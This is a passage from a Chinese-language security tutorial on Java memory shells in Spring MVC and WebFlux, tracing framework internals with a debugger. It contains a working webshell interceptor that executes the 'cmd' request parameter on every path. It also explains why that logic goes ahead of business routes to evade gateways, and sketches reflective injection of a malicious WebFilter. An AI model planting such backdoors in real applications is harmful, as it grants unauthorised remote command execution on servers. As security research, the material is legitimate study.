ApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能。ApplicationContext在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。
```

#### 3.Spring MVC 九大组件

```markdown
这九大组件需要有个印象：

DispatcherServlet（派发Servlet）：负责将请求分发给其他组件，是整个Spring MVC流程的核心；
HandlerMapping（处理器映射）：用于确定请求的处理器（Controller）；
HandlerAdapter（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；
`HandlerInterceptor（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；
`Controller（控制器）：处理用户请求并返回适当的模型和视图；
ModelAndView（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；
ViewResolver（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；
LocaleResolver（区域解析器）：处理区域信息，用于国际化；
ThemeResolver（主题解析器）：用于解析Web应用的主题，实现界面主题的切换。
```

##### 3.0.九大组件的初始化

首先是找到`org.springframework.web.servlet.DispatcherServlet`，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数：

![image-20250620172655468](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250620172655468.png)

但是没有`init()`函数，我们翻看其父类FrameworkServlet的父类`org.springframework.web.servlet.HttpServletBean`的时候发现有init函数：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240118153925178.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118153925178.png)

代码如下：

```
@Override
public final void init() throws ServletException {

    // Set bean properties from init parameters.
    PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties);
    if (!pvs.isEmpty()) {
        try {
            BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this);
            ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext());
            bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment()));
            initBeanWrapper(bw);
            bw.setPropertyValues(pvs, true);
        }
        catch (BeansException ex) {
            if (logger.isErrorEnabled()) {
                logger.error("Failed to set bean properties on servlet '" + getServletName() + "'", ex);
            }
            throw ex;
        }
    }

    // Let subclasses do whatever initialization they like.
    initServletBean();
}
```

先是从Servlet的配置中获取初始化参数并创建一个PropertyValues对象，然后设置Bean属性；关键在最后一步，调用了initServletBean这个方法。

我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候override了该方法：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240118154412364.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154412364.png)

果不其然，我们在`org.springframework.web.servlet.FrameworkServlet`中成功找到了该方法：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240118154436747.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154436747.png)

代码如下：

```
@Override
protected final void initServletBean() throws ServletException {
    getServletContext().log("Initializing Spring " + getClass().getSimpleName() + " '" + getServletName() + "'");
    if (logger.isInfoEnabled()) {
        logger.info("Initializing Servlet '" + getServletName() + "'");
    }
    long startTime = System.currentTimeMillis();

    try {
        this.webApplicationContext = initWebApplicationContext();
        initFrameworkServlet();
    }
    catch (ServletException | RuntimeException ex) {
        logger.error("Context initialization failed", ex);
        throw ex;
    }

    if (logger.isDebugEnabled()) {
        String value = this.enableLoggingRequestDetails ?
                "shown which may lead to unsafe logging of potentially sensitive data" :
                "masked to prevent unsafe logging of potentially sensitive data";
        logger.debug("enableLoggingRequestDetails='" + this.enableLoggingRequestDetails +
                "': request parameters and headers will be " + value);
    }

    if (logger.isInfoEnabled()) {
        logger.info("Completed initialization in " + (System.currentTimeMillis() - startTime) + " ms");
    }
}
```

这段代码的log和计时部分就不说了，我们捡关键的说。它先是调用initWebApplicationContext方法，初始化IOC容器，在初始化的过程中，会调用到这个onRefresh方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240118155901114.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118155901114.png)

跟入该方法，可以看到其中默认为空：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240118160618786.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160618786.png)

说明在它的子类中应该会有override，果然我们定位到了`org.springframework.web.servlet.DispatcherServlet#`方法：这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了Spring MVC的九大组件的初始化。

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240118160730953.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160730953.png)

##### 3.1.SpringMVC 框架Interceptor组件

###### 1.编写一个简单的 SpringMVC 框架Interceptor组件

TestInterceptor.java

```java
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class TestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if(cmd != null){
            try {
                java.io.PrintWriter writer = response.getWriter();
                String output = "";
                ProcessBuilder processBuilder;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    processBuilder = new ProcessBuilder("cmd.exe", "/c", cmd);
                }else{
                    processBuilder = new ProcessBuilder("/bin/sh", "-c", cmd);
                }
                java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
                output = inputScanner.hasNext() ? inputScanner.next(): output;
                inputScanner.close();
                writer.write(output);
                writer.flush();
                writer.close();
            } catch (Exception ignored){}
            return false;
        }
        return true;
    }
}
```

WebConfig.java

```java
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");
    }
}
```

Controller就是2.5.0写的TestController.java

```java
package com.example.springbootstudy.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloController {
    @RequestMapping("/hello")
    public String index() {
        return "Hello World";
    }
}
```

运行Spring并且访问http://127.0.0.1:8080/?cmd=ps%20-a，成功命令执行

![image-20250604143628258](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604143628258.png)

![image-20250604144244554](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604144244554.png)

###### 2.Spring Interceptor引入与执行流程分析

我们回顾之前聊到的`Controller`的思路和下面的所展示的`Controller`内存马，可以考虑到这样一个问题：

```markdown
随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的`shell`路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入`java`内存马时，尽量不要使用新的路由来专门处理我们注入的`webshell`逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们`webshell`逻辑的处理。`在`tomcat`容器下，有`filter`、`listener`等技术可以达到上述要求。那么在 `spring` 框架层面下，有办法达到上面所说的效果吗？ ——摘编自`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md`和`https://landgrey.me/blog/19/``
```

答案是当然有，这就是我们要讲的`Spring Interceptor`，`Spring`框架中的一种拦截器机制。那就不禁要问了：这个`Spring Interceptor`和我们之前所说的`Filter`的区别是啥？参考：https://developer.aliyun.com/article/925400

主要有以下六个方面：

| 主要区别                 | 拦截器                                                   | 过滤器                      |
| ------------------------ | -------------------------------------------------------- | --------------------------- |
| 机制                     | `Java`反射机制                                           | 函数回调                    |
| 是否依赖`Servlet`容器    | 不依赖                                                   | 依赖                        |
| 作用范围                 | 对`action`请求起作用                                     | 对几乎所有请求起作用        |
| 是否可以访问上下文和值栈 | 可以访问                                                 | 不能访问                    |
| 调用次数                 | 可以多次被调用                                           | 在容器初始化时只被调用一次  |
| `IOC`容器中的访问        | 可以获取`IOC`容器中的各个`bean`（基于`FactoryBean`接口） | 不能在`IOC`容器中获取`bean` |



一步步步入调试之后，发现进入`org.springframework.web.servlet.DispatcherServlet#doDispatch`方法：

![image-20250604181950369](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604181950369-9032394.png)

我们在doDispatch方法的第一行下断点，重新访问页面调试：

![image-20250604181720018](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604181720018.png)

step over步入往下走看到了调用了getHandler这个函数，它的注释写的简单易懂：确定处理当前请求的handler，我们step into看看：

![image-20250604183104007](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604183104007.png)

通过遍历当前handlerMapping数组中的handler对象，来判断哪个handler来处理当前的request对象：

![image-20250604183227013](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604183227013-9033148.png)

```markdown
继续step over步入这个函数里面所用到的mapping.getHandler方法，也就是`org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler`：

1.代码简单易懂，先是通过getHandlerInternal来获取，如果获取不到，那就调用getDefaultHandler来获取默认的，如果还是获取不到，就直接返回null；
2.然后检查handler是不是一个字符串，如果是，说明可能是一个Bean的名字，这样的话就通过ApplicationContext来获取对应名字的Bean对象，这样就确保 handler 最终会是一个合法的处理器对象；
3.接着检查是否已经有缓存的请求路径，如果没有缓存就调用 `initLookupPath(request)` 方法来初始化请求路径的查找；
4.最后通过 `getHandlerExecutionChain` 方法创建一个处理器执行链。
```

![image-20250604183455850](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604183455850.png)

![image-20250604183752119](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604183752119.png)

```markdown
这么看下来，这个`getHandlerExecutionChain`方法很重要，我们打断点调试，步入看看：
```

![image-20250604184208749](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604184208749.png)

```markdown
步入到getHandlerExecutionChain:604, AbstractHandlerMapping (org.springframework.web.servlet.handler)

1.如果 handler 已是 HandlerExecutionChain 类型，则直接使用；
2.否则新建一个包装该处理器的执行链，遍历所有adaptedInterceptors拦截器，若拦截器是 MappedInterceptor 类型且匹配当前请求，则将其加入执行链。
3.返回最终的执行链对象。
```

![image-20250604184755558](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604184755558.png)

再回到之前的getHandler方法中来，看看它的后半段：

![image-20250604184903775](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604184903775.png)

主要都是处理跨域资源共享（CORS）的逻辑，只需要知道在涉及CORS的时候把request、executionChain和CORS配置通过`getCorsHandlerExecutionChain`调用封装后返回就行了。

一步步执行回到一开始的getHandler中，这里就是调用`org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle`方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了：

![image-20250604185246764](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604185246764.png)

##### 3.2.编写SpringMVC框架Controller组件

```markdown
在src/main/java文件夹下创建com.example.springbootDemo.controller包，在该包下创建`HelloWorldController` (注意，这里我们的Controller必须在我们的`SpringbootDemoApplication`文件夹及子文件夹下，否则无法加载，Controller类首字母必须大写)
```

```markdown
package com.example.springbootstudy.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloWorldController {
    @RequestMapping("/hello")
    public String index() {
        return "Hello World";
    }
}
```

![image-20250604140828863](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604140828863.png)

```markdown
这里解释一下其中的2个注解的作用:
1. @RestController: 其等价于@ResponseBody + @Controller，分别介绍下这2个注解:
2. @ResponseBody: 设置了这个注解的类/方法返回的值就是return中的内容，无法返回指定的View页面(如index.html等)，但是其能够返回json，xml或自定义mediaType内容到页面(即将一个Object自动序列化成json后返回)
3. @Controller: 表示Spring某个类是否可以接收HTTP请求，能够返回指定的View页面(如return index则会跳转到视图层index.html)
4. @RequestMapping: 设置请求映射(即路由)
```

![image-20250604140759514](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604140759514.png)

**1.配置**

springboot中可以使用application.properties或者application.yml对项目进行配置，后者的优先级较高。两者的区别是前者比较直接，但没有层次感，后者相反。在springboot 2.1之后，springboot启动默认不会显示mapping日志，我们可以通过修改配置来让其输出mapping日志，以了解哪些controller被成功加载，我们以application.properties为例:

```markdown
#第一行设置的是服务的监听端口，第二行就是设置mapping日志级别，以显示我们的mapping日志。
server.port=8080  
logging.level.org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping=trace
```

**2.运行**

```markdown
运行SpringbootStudyApplication.main()方法，启动springboot，有以下信息就证明controller被成功加载了。
```

![image-20250604142243516](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604142243516.png)

![image-20250604142212439](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604142212439.png)



### 2.2.3.Spring WebFlux 框架

```markdown
Spring 5.0 添加了 Spring-WebFlux（韦伯弗拉克思） 模块将默认的 web 服务器改为 Netty，支持 Reactive 应用，它的特点是：
1. 完全非阻塞式的（non-blocking）
2. 支持 Reactive Stream 背压（Reactive Streams back pressure）
3. 运行在 Netty, Undertow, and Servlet 3.1+ 容器
```

#### 1.对比 Spring MVC

```markdown
Spring MVC 构建于 Servlet API 之上，使用的是同步阻塞式 I/O 模型，什么是同步阻塞式 I/O 模型呢？就是说，每一个请求对应一个线程去处理。
Spring WebFlux 是一个异步非阻塞式 IO 模型，通过少量的容器线程就可以支撑大量的并发访问，所以 Spring WebFlux 可以有效提升系统的吞吐量和伸缩性，特别是在一些 IO 密集型应用中，Spring WebFlux 的优势明显。例如微服务网关 Spring Cloud Gateway 就使用了 WebFlux，这样可以有效提升网管对下游服务的吞吐量。


Spring WebFlux 与 Spring MVC 的关系如下图，可见，Spring WebFlux 并不是为了替代 Spring MVC 的，它与 Spring MVC 一起形成了两套 WEB 框架。两套框架有交集比如对 `@Controller` 注解的使用，以及均可使用 Tomcat、Jetty、Undertow 作为 Web 容器。
```

![img](https://pic2.zhimg.com/v2-e616e4719b085d04793d925a37a82ce1_1440w.jpg)

#### 2.什么是Mono和Flux

```markdown
WebFlux框架开发的接口返回类必须是`Mono<T>`或者是`Flux<T>`。因此我们第一个需要了解的就是什么是Mono以及什么是Flux。
```

##### 2.0 Mono

```markdown
Mono用来表示`包含0或1个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型`。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在Mono中，`这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回`，就像我们在2.10.3节中的那张gif图中所看到的那样。
```

下面我们来看看Mono常用的api：

| API                                                          | 说明                                                         | 代码示例                                                     |
| :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| `Mono.just(T data)`                                          | 创建一个包含指定数据的 Mono。                                | `Mono<String> mono = Mono.just("Hello, Mono!");`             |
| `Mono.empty()`                                               | 创建一个空的 Mono。                                          | `Mono<Object> emptyMono = Mono.empty();`                     |
| `Mono.error(Throwable error)`                                | 创建一个包含错误的 Mono。                                    | `Mono<Object> errorMono = Mono.error(new RuntimeException("Something went wrong"));` |
| `Mono.fromCallable(Callable<T> supplier)`                    | 从 Callable 创建 Mono，表示可能抛出异常的异步操作。          | `Mono<String> resultMono = Mono.fromCallable(() -> expensiveOperation());` |
| `Mono.fromRunnable(Runnable runnable)`                       | 从 Runnable 创建 Mono，表示没有返回值的异步操作。            | `Mono<Void> runnableMono = Mono.fromRunnable(() -> performAsyncTask());` |
| `Mono.delay(Duration delay)`                                 | 在指定的延迟后创建一个空的 Mono。                            | `Mono<Object> delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just("Delayed Result"));` |
| `Mono.defer(Supplier<? extends Mono<? extends T>> supplier)` | 延迟创建 Mono，直到订阅时才调用供应商方法。                  | `Mono<String> deferredMono = Mono.defer(() -> Mono.just("Deferred Result"));` |
| `Mono.whenDelayError(Iterable<? extends Mono<? extends T>> monos)` | 将一组 Mono 合并为一个 Mono，当其中一个出错时，继续等待其他的完成。 | `Mono<String> resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));` |
| `Mono.map(Function<? super T, ? extends V> transformer)`     | 对 Mono 中的元素进行映射。                                   | `Mono<Integer> resultMono = mono.map(s -> s.length());`      |
| `Mono.flatMap(Function<? super T, ? extends Mono<? extends V>> transformer)` | 对 Mono 中的元素进行异步映射。                               | `Mono<Integer> resultMono = mono.flatMap(s -> Mono.just(s.length()));` |
| `Mono.filter(Predicate<? super T> tester)`                   | 过滤 Mono 中的元素。                                         | `Mono<String> filteredMono = mono.filter(s -> s.length() > 5);` |
| `Mono.defaultIfEmpty(T defaultVal)`                          | 如果 Mono 为空，则使用默认值。                               | `Mono<String> resultMono = mono.defaultIfEmpty("Default Value");` |
| `Mono.onErrorResume(Function<? super Throwable, ? extends Mono<? extends T>> fallback)` | 在发生错误时提供一个备用的 Mono。                            | `Mono<String> resultMono = mono.onErrorResume(e -> Mono.just("Fallback Value"));` |
| `Mono.doOnNext(Consumer<? super T> consumer)`                | 在成功时执行操作，但不更改元素。                             | `Mono<String> resultMono = mono.doOnNext(s -> System.out.println("Received: " + s));` |
| `Mono.doOnError(Consumer<? super Throwable> onError)`        | 在发生错误时执行操作。                                       | `Mono<String> resultMono = mono.doOnError(e -> System.err.println("Error: " + e.getMessage()));` |
| `Mono.doFinally(Consumer<SignalType> action)`                | 无论成功还是出错都执行操作。                                 | `Mono<String> resultMono = mono.doFinally(signal -> System.out.println("Processing finished: " + signal));` |

##### 2.1.Flux

```markdown
Flux表示的是`0到N个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地publish元素`。也就是说，`Flux允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者`。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。
```

下面是Flux常用的api：

| API                   | 说明                                     | 代码示例                                                     |
| :-------------------- | :--------------------------------------- | :----------------------------------------------------------- |
| **Flux.just**         | 创建包含指定元素的`Flux`                 | `Flux<String> flux = Flux.just("A", "B", "C");`              |
| **Flux.fromIterable** | 从`Iterable`创建`Flux`                   | `List<String> list = Arrays.asList("A", "B", "C");` `Flux<String> flux = Flux.fromIterable(list);` |
| **Flux.fromArray**    | 从数组创建`Flux`                         | `String[] array = {"A", "B", "C"};` `Flux<String> flux = Flux.fromArray(array);` |
| **Flux.empty**        | 创建一个空的`Flux`                       | `Flux<Object> emptyFlux = Flux.empty();`                     |
| **Flux.error**        | 创建一个包含错误的`Flux`                 | `Flux<Object> errorFlux = Flux.error(new RuntimeException("Something went wrong"));` |
| **Flux.range**        | 创建包含指定范围的整数序列的`Flux`       | `Flux<Integer> rangeFlux = Flux.range(1, 5);`                |
| **Flux.interval**     | 创建包含定期间隔的元素的`Flux`           | `Flux<Long> intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);` |
| **Flux.merge**        | 合并多个Flux，按照时间顺序交织元素       | `Flux<String> flux1 = Flux.just("A", "B");` `Flux<String> flux2 = Flux.just("C", "D");` `Flux<String> mergedFlux = Flux.merge(flux1, flux2);` |
| **Flux.concat**       | 连接多个`Flux`，按照顺序发布元素         | `Flux<String> flux1 = Flux.just("A", "B");` `Flux<String> flux2 = Flux.just("C", "D");` `Flux<String> concatenatedFlux = Flux.concat(flux1, flux2);` |
| **Flux.zip**          | 将多个`Flux`的元素进行配对，生成`Tuple`  | `Flux<String> flux1 = Flux.just("A", "B");` `Flux<String> flux2 = Flux.just("1", "2");` `Flux<Tuple2<String, String>> zippedFlux = Flux.zip(flux1, flux2);` |
| **Flux.filter**       | 过滤满足条件的元素                       | `Flux<Integer> numbers = Flux.range(1, 5);` `Flux<Integer> filteredFlux = numbers.filter(n -> n % 2 == 0);` |
| **Flux.map**          | 转换每个元素的值                         | `Flux<String> words = Flux.just("apple", "banana", "cherry");` `Flux<Integer> wordLengths = words.map(String::length);` |
| **Flux.flatMap**      | 将每个元素映射到一个`Flux`，并将结果平铺 | `Flux<String> letters = Flux.just("A", "B", "C");` `Flux<String> flatMappedFlux = letters.flatMap(letter -> Flux.just(letter, letter.toLowerCase()));` |

#### 3.编写一个简单的编写一个简单的 Spring WebFlux （基于 Netty）

```java
新建一个SpringBoot项目，取名SpringWebFluxDemo
1.使用JDK8
2.Serverurl填写https://start.aliyun.com/
3.SpringBoot选择2.6.13
```

![image-20250604145033959](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604145033959.png)

```java
选择Spring Reactive Web
```

![image-20250604145132389](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604145132389.png)

接着新建一个demo文件，加入两个类

`GreetingHandler.java`：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

@Component
public class GreetingHandler {
    public Mono<ServerResponse> hello(ServerRequest request) {
        return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue("Hello, Spring!"));
    }
}
```

`GreetingRouter.java`：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.web.reactive.function.server.*;

@Configuration
public class GreetingRouter {
    @Bean
    public RouterFunction<ServerResponse> route(GreetingHandler greetingHandler) {
        return RouterFunctions.route(RequestPredicates.GET("/hello").and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);
    }
}
```

![image-20250604154112363](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604154112363.png)

```java
1.新建`main/resources`文件夹，然后新建`application.properties`，通过server.port来控制netty服务的端口：
```

![image-20250604154318252](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604154318252.png)

```markdown
1.启动主类`SpringWebFluxDemoApplication`，访问`http://localhost:8080/hello`可以成功运行
```

![image-20250604154407631](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604154407631.png)

#### 4.Spring WebFlux 启动过程分析

```markdown
我们直接在run方法这里下断点，然后直接step into：
```

![image-20250604192000321](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604192000321.png)

```markdown
最后跟进到真正的webServer启动的关键方法是org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer，断点调试

单步跳过，从下面的this.webServer中也可以看到，绑定的是0.0.0.0:9191：
```

![image-20250604192201739](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604192201739.png)

![image-20250604192819140](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604192819140.png)

#### 5.Spring WebFlux 请求处理过程分析

```markdown
当一个请求过来的时候，Spring WebFlux是如何进行处理的呢？
这里我们在org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello这里打上断点，然后进行调试，访问http://127.0.0.1:9191/hello触发debug：
```

![image-20250604193541581](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604193541581.png)

```markdown
1. 最后多次步入发现是在org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle方法
2. 而这里的handlerFunction.handle也就是我们编写的route方法
```

![image-20250604193924969](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604193924969.png)

#### 6.★Spring WebFlux 过滤器 WebFilter 运行过程分析

```markdown
`对于Spring WebFlux而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用Filter`，关于这一部分知识可以参考Spring的官方文档。

而在Spring Webflux中，存在两种类型的过滤器：
1.WebFilter，实现自org.springframework.web.server.WebFilter接口。通过实现这个接口，`可以定义全局的过滤器`，它可以在请求被路由到handler之前或者之后执行一些逻辑；
2.HandlerFilterFunction，它是一种函数式编程的过滤器类型，实现自org.springframework.web.reactive.function.server.HandlerFilterFunction接口，与WebFilter相比它更加注重函数式编程的风格，`可以用于处理基于路由的过滤逻辑`。
```

这里我们以WebFilter为例，看看它的运行过程。新建一个GreetingFilter.java，代码如下：

```markdown
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;
import reactor.core.publisher.Mono;

@Component
public class GreetingFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
        PathPattern pattern=new PathPatternParser().parse("/hello/**");
        ServerHttpRequest request=serverWebExchange.getRequest();
        if (pattern.matches(request.getPath().pathWithinApplication())){
            System.out.println("hello, this is our filter!");
        }
        return webFilterChain.filter(serverWebExchange);
    }
}
```

```markdown
运行后，访问http://127.0.0.1:8080/hello，经过过滤器输出
```

![image-20250604195719182](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604195719182.png)

我们直接在filter函数这里下断点，进行调试：

![image-20250604200144194](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604200144194.png)

注意到return中调用了filter函数，于是step into看看：

![image-20250604200304263](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604200304263.png)

可以看到是调用了invokeFilter函数。我们仔细看看这个DefaultWebFilterChain类：

![image-20250604200458129](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604200458129.png)

```markdown
可以看到是有三个名为DefaultWebFilterChain的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建`chain`的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话：

`Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link.`
```

![image-20250604200947997](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604200947997.png)

也就是说，通过调用 `DefaultWebFilterChain` 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个link，而不是一个chain，这就意味着我们无法通过修改下图中的`chain.allFilters`来实现新增Filter：

![image-20250605092529808](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605092529808.png)

但是这个类里面有个initChain方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法：

![image-20250605092721841](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605092721841.png)

那我们就看看这个公共构造方法是在哪里调用的：

光标移至该方法，按两下`Ctrl+Alt+F7`：调用的地方位于`org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler`：

![image-20250605094100204](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605094100204.png)

```markdown
1. 我们只需要构造一个`DefaultWebFilterChain`对象，，然后把它通过反射写入到`FilteringWebHandler`类对象的chain属性中就可以了。那现在就剩下传入handler和filters这两个参数了，这个`handler参数很好搞，就在chain里面`：
2. 然后这个filters的话，我们可以先获取到它本来的filters，然后把我们自己写的恶意filter放进去，放到第一位，就可以了。
3. 从内存中找到DefaultWebFilterChain的位置，然后一步步反射就行。这里直接使用工具，克隆下来该项目，放到idea中mvn clean install...
```

![image-20250605094343042](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605094343042.png)

# 三.中间件系内存马

## 3.X.关于 StandardContext、ApplicationContext、ServletContext 的理解

这里直接挪用yzddmr6师傅的文章，写的非常通俗易懂，这里直接贴出链接：

- https://yzddmr6.com/posts/tomcat-context/

#### 1. Context

```markdown
context是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？

